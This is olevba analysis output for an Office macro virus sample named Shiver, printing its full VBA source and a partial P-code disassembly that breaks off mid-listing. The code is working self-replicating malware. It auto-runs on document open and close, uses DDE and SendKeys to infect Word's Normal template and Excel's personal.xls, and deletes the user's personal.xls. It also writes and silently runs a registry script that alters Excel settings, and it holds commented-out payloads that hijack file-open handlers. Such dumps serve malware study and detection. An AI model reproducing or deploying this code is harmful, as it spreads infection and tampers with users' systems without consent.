olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Shiver.m
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSOffice.Shiver.m - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: Virus.MSOffice.Shiver.m - OLE stream: 'Macros/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 















































Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal strClassName As String, ByVal lpWindowName As Any) As Long
Attribute FindWindow.VB_ProcData.VB_Invoke_Func = " \n14"

Public ExcelFound, WordFound, Marker, JustRun As Boolean



Sub WordStealth()
Attribute WordStealth.VB_ProcData.VB_Invoke_Func = " \n14"
Yin = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If Yin < 4 Then
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromString "Sub ToolsMacro()" & vbCr & "End Sub" & vbCr & "Sub FileTemplates()" & vbCr & "End Sub" & vbCr & "Sub ViewVBCode()" & vbCr & "End Sub"
End If
End Sub

Sub AutoExit()
Attribute AutoExit.VB_ProcData.VB_Invoke_Func = " \n14"

Randomize

On Error GoTo out

Call CheckMarker

hWnd = FindApp("XLMain")

If hWnd <> 0 Then ExcelFound = True

If ExcelFound = False And Marker = False Then

Application.WindowState = wdWindowStateMinimize

Call PersonalFun
Shell (Application.Path + "\Excel.exe"), vbMinimizedFocus
Do While ExcelFound = False
    Call FindExcel
Loop

Application.DDETerminateAll

CNL = Application.DDEInitiate("Excel", "system")
Application.DDEExecute CNL, "[New(4)]"
Application.DDETerminate CNL

CNL = Application.DDEInitiate("Excel", "Macro1")
Application.DDEPoke CNL, Item:="R1C1", Data:="=VBA.INSERT.FILE(""c:\shiver.sys"")"
Application.DDEPoke CNL, Item:="R2C1", Data:="=SAVE.AS(""" & Application.Path & "\xlstart\personal.xls"")"
Application.DDEPoke CNL, Item:="R3C1", Data:="=Return()"
DDEExecute channel:=CNL, Command:="[Run(""R1C1"")]"
Application.DDETerminate CNL

CNL = Application.DDEInitiate("Excel", "system")
Application.DDEExecute CNL, "[RUN(""Personal.xls!PXL_Done"")]"
Application.DDETerminate CNL

Call MakeMarker

JustRun = True

End If

out:

If (Int(Rnd * 30) = 5) Then Call wdReEvalInfection

End Sub

Sub FindExcel()
Attribute FindExcel.VB_ProcData.VB_Invoke_Func = " \n14"
On Error Resume Next
For x = 1 To 50
    w = Tasks.Item(x)
    If Mid(w, 1, 15) = "Microsoft Excel" Then
        ExcelFound = True
        Exit Sub
    End If
Next x
End Sub

Function FindApp(ByVal varClassName As Variant) As Long
Attribute FindApp.VB_ProcData.VB_Invoke_Func = " \n14"
   If IsNull(varClassName) Then
      FindApp = 0
   Else
      FindApp = FindWindow(CStr(varClassName), 0&)
   End If
End Function


Sub PersonalFun()
Attribute PersonalFun.VB_ProcData.VB_Invoke_Func = " \n14"
PSLIVE = Application.Path + "\xlstart\personal.xls"
PS = Dir(PSLIVE)
If "PERSONAL.XLS" = UCase(PS) Then
Kill PSLIVE
End If
End Sub

Sub CheckMarker()
Attribute CheckMarker.VB_ProcData.VB_Invoke_Func = " \n14"
If Application.Application = "Microsoft Word" Then
mkr = System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\VB and VBA Program Settings\Office\8.0", "Shiver[DDE]")
Else
mkr = GetSetting("Office", "8.0", "Shiver[DDE]")
End If
If mkr = "ALT-F11" Then Marker = True
End Sub

Sub MakeMarker()
Attribute MakeMarker.VB_ProcData.VB_Invoke_Func = " \n14"
If Application.Application = "Microsoft Word" Then
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\VB and VBA Program Settings\Office\8.0", "Shiver[DDE]") = "ALT-F11"
Else
SaveSetting "Office", "8.0", "Shiver[DDE]", "ALT-F11"
End If
End Sub

Sub PXL_Done()
Attribute PXL_Done.VB_ProcData.VB_Invoke_Func = " \n14"
ActiveWindow.Visible = False
Workbooks("personal.xls").Save
Application.Quit
End Sub

Sub Auto_Open()
Attribute Auto_Open.VB_ProcData.VB_Invoke_Func = " \n14"
Application.OnSheetActivate = "ShiverTime"
End Sub

Sub ShiverTime()
Attribute ShiverTime.VB_ProcData.VB_Invoke_Func = " \n14"

Randomize

On Error Resume Next

Call xlTrigger

If UCase(Mid(ActiveWorkbook.Name, 1, 4)) = "BOOK" Then GoTo out:

Application.VBE.ActiveVBProject.VBComponents.Item("Module1").Export "c:\shiver.sys"

CommandBars("Window").Controls("Unhide...").Enabled = True
CommandBars("Tools").Controls("Macro").Enabled = True

If UCase(Dir(Application.StartupPath + "\personal.xls")) = UCase("personal.xls") Then PXLS = True

For i = 1 To ActiveWorkbook.VBProject.VBComponents.Count
If ActiveWorkbook.VBProject.VBComponents(i).Name = "Module1" Then SXLS = True
Next i

If SXLS = False Then
ActiveWorkbook.VBProject.VBComponents.Import ("c:\shiver.sys")
ActiveWorkbook.Save
End If

If PXLS = False Then
Workbooks.Add.SaveAs FileName:=Application.StartupPath & "\personal.xls", FileFormat:=xlNormal, AddToMru:=False
ActiveWorkbook.VBProject.VBComponents.Import ("c:\shiver.sys")
ActiveWindow.Visible = False
Workbooks("personal.xls").Save
End If

out:

If UCase(Dir("c:\o6.reg")) <> "O6.REG" Or UCase(Dir("c:\o6.bat")) <> "O6.BAT" Then

Open "c:\o6.reg" For Output As 1
Print #1, "REGEDIT4"
Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel]"
Print #1, """Options6""=dword:00000000"
Close 1

Open "c:\o6.bat" For Output As 1
Print #1, "regedit /s c:\o6.reg"
Close 1
End If

End Sub

Sub wdTrigger()
Attribute wdTrigger.VB_ProcData.VB_Invoke_Func = " \n14"
On Error Resume Next
Randomize
Application.EnableCancelKey = wdCancelDisabled
ShowVisualBasicEditor = False
If Int(Rnd * 800) = 601 Then
For x = 1 To 16
Selection.WholeStory
Selection.Range.HighlightColorIndex = x
For y = 1 To 1000000
Next y
If x > 3 Then x = x - Int(Rnd * 3)
Next x
' REM Bad Payload REM
'System.PrivateProfileString("", "HKEY_CLASSES_ROOT\Word.Document.8\shell\open\ddeexec", "") = "[FileExit]"
'System.PrivateProfileString("", "HKEY_CLASSES_ROOT\Excel.Sheet.8\shell\Open\ddeexec", "") = "[FileExit]"
' REM Bad Payload REM
End If
End Sub

Sub xlTrigger()
Attribute xlTrigger.VB_ProcData.VB_Invoke_Func = " \n14"
On Error Resume Next
Randomize
Application.EnableCancelKey = xlDisabled
If Int(Rnd * 800) = 601 Then
For x = 1 To 30
RR = (Chr(65 + Int(Rnd * 12))) & x
Range(RR).AddComment
Range(RR).Comment.Visible = True
Range(RR).Comment.Text Text:="Shiver[DDE] by ALT-F11"
Range(RR).Comment.Shape.Select True
Selection.ShapeRange.IncrementLeft Int(Rnd * 300)
Selection.ShapeRange.IncrementTop Int(Rnd * 300)
Next x
End If
End Sub


Sub Auto_Close()
Attribute Auto_Close.VB_ProcData.VB_Invoke_Func = " \n14"

On Error GoTo out

Call CheckMarker

hWnd = FindApp("OpusApp")

If hWnd <> 0 Then WordFound = True

If WordFound = False And Marker = False Then

Shell Application.Path & "\winword.exe", vbMinimizedFocus
CNL = Application.DDEInitiate("MSWord", "system")
Application.DDEExecute CNL, "[fileclose]"
Application.DDEExecute CNL, "[Sendkeys ""%{F11}""]"
Application.DDEExecute CNL, "[Sendkeys ""^m""]"
Call delay
SendKeys "c:\shiver.sys", Wait
SendKeys "%o"
Application.DDEExecute CNL, "[Sendkeys ""%{F4}""]"
Application.DDEExecute CNL, "[Sendkeys ""%{F4}""]"
Application.DDEExecute CNL, "[Sendkeys ""y""]"
Application.DDETerminate CNL

Call MakeMarker

JustRun = True

End If

out:

On Error Resume Next
Shell "c:\o6.bat", vbHide

If (Int(Rnd * 30) = 5) Then Call xlReEvalInfection

End Sub

Sub delay()
Attribute delay.VB_ProcData.VB_Invoke_Func = " \n14"
newHour = Hour(Now())
newMinute = Minute(Now())
newSecond = Second(Now()) + 2
waitTime = TimeSerial(newHour, newMinute, newSecond)
Application.Wait waitTime
End Sub

Sub wdReEvalInfection()
Attribute wdReEvalInfection.VB_ProcData.VB_Invoke_Func = " \n14"
If UCase(Dir(Application.Path + "\xlstart\personal.xls")) <> "PERSONAL.XLS" And Marker = True And JustRun <> True Then
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\VB and VBA Program Settings\Office\8.0", "Shiver[DDE]") = "NoNoNo"
End If
End Sub

Sub xlReEvalInfection()
Attribute xlReEvalInfection.VB_ProcData.VB_Invoke_Func = " \n14"
If UCase(Dir(Application.Path & "\startup\Word8.dot")) <> "WORD8.DOT" And Marker = True And JustRun <> True Then
SaveSetting "Office", "8.0", "Shiver[DDE]", "NoNoNo"
End If
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSOffice.Shiver.m
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/Module1 - 14970 bytes
' Line #0:
' Line #1:
' Line #2:
' Line #3:
' Line #4:
' Line #5:
' Line #6:
' Line #7:
' Line #8:
' Line #9:
' Line #10:
' Line #11:
' Line #12:
' Line #13:
' Line #14:
' Line #15:
' Line #16:
' Line #17:
' Line #18:
' Line #19:
' Line #20:
' Line #21:
' Line #22:
' Line #23:
' Line #24:
' Line #25:
' Line #26:
' Line #27:
' Line #28:
' Line #29:
' Line #30:
' Line #31:
' Line #32:
' Line #33:
' Line #34:
' Line #35:
' Line #36:
' Line #37:
' Line #38:
' Line #39:
' Line #40:
' Line #41:
' Line #42:
' Line #43:
' Line #44:
' Line #45:
' Line #46:
' Line #47:
' 	FuncDefn (Declare Function FindWindow Lib "user32" (ByVal strClassName As String, ByVal lpWindowName As ) As Long)
' Line #48:
' Line #49:
' 	Dim (Public) 
' 	VarDefn ExcelFound
' 	VarDefn WordFound
' 	VarDefn Marker
' 	VarDefn JustRun (As Boolean)
' Line #50:
' Line #51:
' Line #52:
' Line #53:
' 	FuncDefn (Sub WordStealth())
' Line #54:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St Yin 
' Line #55:
' 	Ld Yin 
' 	LitDI2 0x0004 
' 	Lt 
' 	IfBlock 
' Line #56:
' 	LitStr 0x0010 "Sub ToolsMacro()"
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0013 "Sub FileTemplates()"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0010 "Sub ViewVBCode()"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #57:
' 	EndIfBlock 
' Line #58:
' 	EndSub 
' Line #59:
' Line #60:
' 	FuncDefn (Sub AutoExit())
' Line #61:
' Line #62:
' 	ArgsCall Read 0x0000 
' Line #63:
' Line #64:
' 	OnError out 
' Line #65:
' Line #66:
' 	ArgsCall (Call) CheckMarker 0x0000 
' Line #67:
' Line #68:
' 	LitStr 0x0006 "XLMain"
' 	ArgsLd FindApp 0x0001 
' 	St hWnd 
' Line #69:
' Line #70:
' 	Ld hWnd 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St ExcelFound 
' 	EndIf 
' Line #71:
' Line #72:
' 	Ld ExcelFound 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld Marker 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	IfBlock 
' Line #73:
' Line #74:
' 	Ld wdWindowStateMinimize 
' 	Ld Application 
' 	MemSt WindowState 
' Line #75:
' Line #76:
' 	ArgsCall (Call) PersonalFun 0x0000 
' Line #77:
' 	Ld Application 
' 	MemLd Path 
' 	LitStr 0x000A "\Excel.exe"
' 	Add 
' 	Paren 
' 	Ld vbMinimizedFocus 
' 	ArgsCall Shell 0x0002 
' Line #78:
' 	Ld ExcelFound 
' 	LitVarSpecial (False)
' 	Eq 
' 	DoWhile 
' Line #79:
' 	ArgsCall (Call) FindExcel 0x0000 
' Line #80:
' 	Loop 
' Line #81:
' Line #82:
' 	Ld Application 
' 	ArgsMemCall DDETerminateAll 0x0000 
' Line #83:
' Line #84:
' 	LitStr 0x0005 "Excel"
' 	LitStr 0x0006 "system"
' 	Ld Application 
' 	ArgsMemLd DDEInitiate 0x0002 
' 	St CNL 
' Line #85:
' 	Ld CNL 
' 	LitStr 0x0008 "[New(4)]"
' 	Ld Application 
' 	ArgsMemCall DDEExecute 0x0002 
' Line #86:
' 	Ld CNL 
' 	Ld Application 
' 	ArgsMemCall DDETerminate 0x0001 
' Line #87:
' Line #88:
' 	LitStr 0x0005 "Excel"
' 	LitStr 0x0006 "Macro1"
' 	Ld Application 
' 	ArgsMemLd DDEInitiate 0x0002 
' 	St CNL 
' Line #89:
' 	Ld CNL 
' 	LitStr 0x0004 "R1C1"
' 	ParamNamed Item 
' 	LitStr 0x0021 "=VBA.INSERT.FILE("c:\shiver.sys")"
' 	ParamNamed Data 
' 	Ld Application 
' 	ArgsMemCall DDEPoke 0x0003 
' Line #90:
' 	Ld CNL 
' 	LitStr 0x0004 "R2C1"
' 	ParamNamed Item 
' 	LitStr 0x000A "=SAVE.AS(""
' 	Ld Application 
' 	MemLd Path 
' 	Concat 
' 	LitStr 0x0017 "\xlstart\personal.xls")"
' 	Concat 
' 	ParamNamed Data 
' 	Ld Application 
' 	ArgsMemCall DDEPoke 0x0003 
' Line #91:
' 	Ld CNL 
' 	LitStr 0x0004 "R3C1"
' 	ParamNamed Item 
' 	LitStr 0x0009 "=Return()"
' 	ParamNamed Data 
' 	Ld Application 
' 	ArgsMemCall DDEPoke 0x0003 
' Line #92:
' 	Ld CNL 
' 	ParamNamed channel 
' 	LitStr 0x000D "[Run("R1C1")]"
' 	ParamNamed Command 
' 	ArgsCall DDEExecute 0x0002 
' Line #93:
' 	Ld CNL 
' 	Ld Application 
' 	ArgsMemCall DDETerminate 0x0001 
' Line #94:
' Line #95:
' 	LitStr 0x0005 "Excel"
' 	LitStr 0x0006 "system"
' 	Ld Application 
' 	ArgsMemLd DDEInitiate 0x0002 
' 	St CNL 
' Line #96:
' 	Ld CNL 
' 	LitStr 0x001E "[RUN("Personal.xls!PXL_Done")]"
' 	Ld Application 
' 	ArgsMemCall DDEExecute 0x0002 
' Line #97:
' 	Ld CNL 
' 	Ld Application 
' 	ArgsMemCall DDETerminate 0x0001 
' Line #98:
' Line #99:
' 	ArgsCall (Call) MakeMarker 0x0000 
' Line #100:
' Line #101:
' 	LitVarSpecial (True)
' 	St JustRun 
' Line #102:
' Line #103:
' 	EndIfBlock 
' Line #104:
' Line #105:
' 	Label out 
' Line #106:
' Line #107:
' 	Ld Rnd 
' 	LitDI2 0x001E 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0005 
' 	Eq 
' 	Paren 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) wdReEvalInfection 0x0000 
' 	EndIf 
' Line #108:
' Line #109:
' 	EndSub 
' Line #110:
' Line #111:
' 	FuncDefn (Sub FindExcel())
' Line #112:
' 	OnError (Resume Next) 
' Line #113:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0032 
' 	For 
' Line #114:
' 	Ld x 
' 	Ld Tasks 
' 	ArgsMemLd Item 0x0001 
' 	St w 
' Line #115:
' 	Ld w 
' 	LitDI2 0x0001 
' 	LitDI2 0x000F 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x000F "Microsoft Excel"
' 	Eq 
' 	IfBlock 
' Line #116:
' 	LitVarSpecial (True)
' 	St ExcelFound 
' Line #117:
' 	ExitSub 
' Line #118:
' 	EndIfBlock 
' Line #119:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #120:
' 	EndSub 
' Line #121:
' Line #122:
' 	FuncDefn (Function FindApp(ByVal varClassName As Variant) As Long)
' Line #123:
' 	Ld varClassName 
' 	ArgsLd IsNull 0x0001 
' 	IfBlock 
' Line #124:
' 	LitDI2 0x0000 
' 	St FindApp 
' Line #125:
' 	ElseBlock 
' Line #126:
' 	Ld varClassName 
' 	Coerce (Str) 
' 	LitDI4 0x0000 0x0000 
' 	ArgsLd FindWindow 0x0002 
' 	St FindApp 
' Line #127:
' 	EndIfBlock 
' Line #128:
' 	EndFunc 
' Line #129:
' Line #130:
' Line #131:
' 	FuncDefn (Sub PersonalFun())
' Line #132:
' 	Ld Application 
' 	MemLd Path 
' 	LitStr 0x0015 "\xlstart\personal.xls"
' 	Add 
' 	St PSLIVE 
' Line #133:
' 	Ld PSLIVE 
' 	ArgsLd Dir 0x0001 
' 	St PS 
' Line #134:
' 	LitStr 0x000C "PERSONAL.XLS"
' 	Ld PS 
' 	ArgsLd UCase 0x0001 
' 	Eq 
' 	IfBlock 
' Line #135:
' 	Ld PSLIVE 
' 	ArgsCall Kill 0x0001 
' Line #136:
' 	EndIfBlock 
' Line #137:
' 	EndSub 
' Line #138:
' Line #139:
' 	FuncDefn (Sub CheckMarker())
' Line #140:
' 	Ld Application 
' 	MemLd Application 
' 	LitStr 0x000E "Microsoft Word"
' 	Eq 
' 	IfBlock 
' Line #141:
' 	LitStr 0x0000 ""
' 	LitStr 0x0041 "HKEY_CURRENT_USER\Software\VB and VBA Program Settings\Office\8.0"
' 	LitStr 0x000B "Shiver[DDE]"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St mkr 
' Line #142:
' 	ElseBlock 
' Line #143:
' 	LitStr 0x0006 "Office"
' 	LitStr 0x0003 "8.0"
' 	LitStr 0x000B "Shiver[DDE]"
' 	ArgsLd GetSetting 0x0003 
' 	St mkr 
' Line #144:
' 	EndIfBlock 
' Line #145:
' 	Ld mkr 
' 	LitStr 0x0007 "ALT-F11"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St Marker 
' 	EndIf 
' Line #146:
' 	EndSub 
' Line #147:
' Line #148:
' 	FuncDefn (Sub MakeMarker())
' Line #149:
' 	Ld Application 
' 	MemLd Application 
' 	LitStr 0x000E "Microsoft Word"
' 	Eq 
' 	IfBlock 
' Line #150:
' 	LitStr 0x0007 "ALT-F11"
' 	LitStr 0x0000 ""
' 	LitStr 0x0041 "HKEY_CURRENT_USER\Software\VB and VBA Program Settings\Office\8.0"
' 	LitStr 0x000B "Shiver[DDE]"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #151:
' 	ElseBlock 
' Line #152:
' 	LitStr 0x0006 "Office"
' 	LitStr 0x0003 "8.0"
' 	LitStr 0x000B "Shiver[DDE]"
' 	LitStr 0x0007 "ALT-F11"
' 	ArgsCall SaveSetting 0x0004 
' Line #153:
' 	EndIfBlock 
' Line #154:
' 	EndSub 
' Line #155:
' Line #156:
' 	FuncDefn (Sub PXL_Done())
' Line #157:
' 	LitVarSpecial (False)
' 	Ld ActiveWindow 
' 	MemSt Visible 
' Line #158:
' 	LitStr 0x000C "personal.xls"
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemCall Save 0x0000 
' Line #159:
' 	Ld Application 
' 	ArgsMemCall Quit 0x0000 
' Line #160:
' 	EndSub 
' Line #161:
' Line #162:
' 	FuncDefn (Sub Auto_Open())
' Line #163:
' 	LitStr 0x000A "ShiverTime"
' 	Ld Application 
' 	MemSt OnSheetActivate 
' Line #164:
' 	EndSub 
' Line #165:
' Line #166:
' 	FuncDefn (Sub ShiverTime())
' Line #167:
' Line #168:
' 	ArgsCall Read 0x0000 
' Line #169:
' Line #170:
' 	OnError (Resume Next) 
' Line #171:
' Line #172:
' 	ArgsCall (Call) xlTrigger 0x0000 
' Line #173:
' Line #174:
' 	Ld ActiveWorkbook 
' 	MemLd New 
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0004 "BOOK"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	BoS 0x0000 
' 	EndIf 
' Line #175:
' Line #176:
' 	LitStr 0x000D "c:\shiver.sys"
' 	LitStr 0x0007 "Module1"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #177:
' Line #178:
' 	LitVarSpecial (True)
' 	LitStr 0x0009 "Unhide..."
' 	LitStr 0x0006 "Window"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #179:
' 	LitVarSpecial (True)
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #180:
' Line #181:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x000D "\personal.xls"
' 	Add 
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x000C "personal.xls"
' 	ArgsLd UCase 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St PXLS 
' 	EndIf 
' Line #182:
' Line #183:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveWorkbook 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #184:
' 	Ld i 
' 	Ld ActiveWorkbook 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0007 "Module1"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St SXLS 
' 	EndIf 
' Line #185:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #186:
' Line #187:
' 	Ld SXLS 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #188:
' 	LitStr 0x000D "c:\shiver.sys"
' 	Paren 
' 	Ld ActiveWorkbook 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #189:
' 	Ld ActiveWorkbook 
' 	ArgsMemCall Save 0x0000 
' Line #190:
' 	EndIfBlock 
' Line #191:
' Line #192:
' 	Ld PXLS 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #193:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x000D "\personal.xls"
' 	Concat 
' 	ParamNamed FileName 
' 	Ld xlNormal 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToMru 
' 	Ld Workbooks 
' 	MemLd Add 
' 	ArgsMemCall SaveAs 0x0003 
' Line #194:
' 	LitStr 0x000D "c:\shiver.sys"
' 	Paren 
' 	Ld ActiveWorkbook 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #195:
' 	LitVarSpecial (False)
' 	Ld ActiveWindow 
' 	MemSt Visible 
' Line #196:
' 	LitStr 0x000C "personal.xls"
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemCall Save 0x0000 
' Line #197:
' 	EndIfBlock 
' Line #198:
' Line #199:
' 	Label out 
' Line #200:
' Line #201:
' 	LitStr 0x0009 "c:\o6.reg"
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0006 "O6.REG"
' 	Ne 
' 	LitStr 0x0009 "c:\o6.bat"
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0006 "O6.BAT"
' 	Ne 
' 	Or 
' 	IfBlock 
' Line #202:
' Line #203:
' 	LitStr 0x0009 "c:\o6.reg"
' 	LitDI2 0x0001 
' 	LitDefault 
' 	Open (For Output)
' Line #204:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "REGEDIT4"
' 	PrintItemNL 
' Line #205:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0047 "[HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel]"
' 	PrintItemNL 
' Line #206:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0019 ""Options6"=dword:00000000"
' 	PrintItemNL 
' Line #207:
' 	LitDI2 0x0001 
' 	Close 0x0001 
' Line #208:
' Line #209:
' 	LitStr 0x0009 "c:\o6.bat"
' 	LitDI2 0x0001 
' 	LitDefault 
' 	Open (For Output)
' Line #210:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "regedit /s c:\o6.reg"
' 	PrintItemNL 
' Line #211:
' 	LitDI2 0x0001 
' 	Close 0x0001 
' Line #212:
' 	EndIfBlock 
' Line #213:
' Line #214:
' 	EndSub 
' Line #215:
' Line #216:
' 	FuncDefn (Sub wdTrigger())
' Line #217:
' 	OnError (Resume Next) 
' Line #218:
' 	ArgsCall Read 0x0000 
' Line #219:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #220:
' 	LitVarSpecial (False)
' 	St ShowVisualBasicEditor 
' Line #221:
' 	Ld Rnd 
' 	LitDI2 0x0320 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0259 
' 	Eq 
' 	IfBlock 
' Line #222:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0010 
' 	For 
' Line #223:
' 	Ld Selection 
' 	ArgsMemCall WholeStory 0x0000 
' Line #224:
' 	Ld x 
' 	Ld Selection 
' 	MemLd Range 
' 	MemSt HighlightColorIndex 
' Line #225:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x4240 0x000F 
' 	For 
' Line #226:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	NextVar 
' Line #227:
' 	Ld x 
' 	LitDI2 0x0003 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	Ld x 
' 	Ld Rnd 
' 	LitDI2 0x0003 
' 	Mul 
' 	FnInt 
' 	Sub 
' 	St x 
' 	EndIf 
' Line #228:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #229:
' 	QuoteRem 0x0000 0x0014 " REM Bad Payload REM"
' Line #230:
' 	QuoteRem 0x0000 0x006A "System.PrivateProfileString("", "HKEY_CLASSES_ROOT\Word.Document.8\shell\open\ddeexec", "") = "[FileExit]""
' Line #231:
' 	QuoteRem 0x0000 0x0068 "System.PrivateProfileString("", "HKEY_CLASSES_ROOT\Excel.Sheet.8\shell\Open\ddeexec", "") = "[FileExit]""
' Line #232:
' 	QuoteRem 0x0000 0x0014 " REM Bad Payload REM"
' Line #233:
' 	EndIfBlock 
' Line #234:
' 	EndSub 
' Line #235:
' Line #236:
' 	FuncDefn (Sub xlTrigger())
' Line #237:
' 	OnError (Resume Next) 
' Line #238:
' 	ArgsCall Read 0x0000 
' Line #239:
' 	Ld xlDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #240:
' 	Ld Rnd 
' 	LitDI2 0x0320 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0259 
' 	Eq 
' 	IfBlock 
' Line #241:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x001E 
' 	For 
' Line #242:
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x000C 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	Ld x 
' 	Concat 
' 	St RR 
' Line #243:
' 	Ld RR 
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall AddComment 0x0000 
' Line #244:
' 	LitVarSpecial (True)
' 	Ld RR 
' 	ArgsLd Range 0x0001 
' 	MemLd Comment 
' 	MemSt Visible 
' Line #245:
' 	LitStr 0x0016 "Shiver[DDE] by ALT-F11"
' 	ParamNamed Then 
' 	Ld RR 
' 	ArgsLd Range 0x0001 
' 	MemLd Comment 
' 	ArgsMemCall Then 0x0001 
' Line #246:
' 	LitVarSpecial (True)
' 	Ld RR 
' 	ArgsLd Range 0x0001 
' 	MemLd Comment 
' 	MemLd Shape 
' 	ArgsMemCall Set 0x0001 
' Line #247:
' 	Ld Rnd 
' 	LitDI2 0x012C 
' 	Mul 
' 	FnInt 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	ArgsMemCall IncrementLeft 0x0001 
' Line #248:
' 	Ld Rnd 
